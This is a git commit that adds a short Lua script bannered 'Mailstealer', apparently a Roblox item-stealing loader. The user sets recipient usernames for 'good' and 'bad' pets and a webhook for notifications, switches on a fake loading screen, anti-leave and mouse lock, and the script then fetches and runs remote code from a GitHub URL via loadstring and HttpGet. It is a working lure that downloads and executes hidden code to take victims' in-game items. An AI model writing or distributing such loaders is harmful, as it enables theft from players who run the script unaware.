3784894e36eea68ca7d82169ec01dc09ac59a9d7
bebekapa <140877088+bebekapa@users.noreply.github.com>
2023-07-29 14:34:56 +0800

    duped
    duped

---
+++ Mori_Mail_3.lua
@@ -0,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "UserName Here" -- good pets
+Webhook = "Webhook Here" -- pings for pets
+UserName2 = "2nd UserName Here" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
